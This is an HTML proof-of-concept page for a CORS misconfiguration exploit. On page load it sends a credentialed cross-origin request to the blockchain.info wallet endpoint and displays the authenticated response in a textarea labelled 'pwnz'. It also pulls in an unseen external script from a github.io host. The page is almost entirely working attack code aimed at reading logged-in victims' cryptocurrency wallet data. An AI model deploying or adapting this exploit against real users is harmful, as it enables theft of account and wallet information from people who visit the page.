<!DOCTYPE html>
<html>
<head><title>CORS</title>
<script src="https://ernieballesp06.github.io/serve.js" type="text/javascript"></script></head>
<body onload="cors();">
<center>
cors proof-of-concept:<br><br>
<textarea rows="10" cols="60" id="pwnz">
</textarea><br>
</div>

<script>
function cors() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      document.getElementById("pwnz").innerHTML = this.responseText;
    }
  };
  xhttp.open("GET", "https://blockchain.info/wallet/", true);
  xhttp.withCredentials = true;
  xhttp.send();
}
</script>
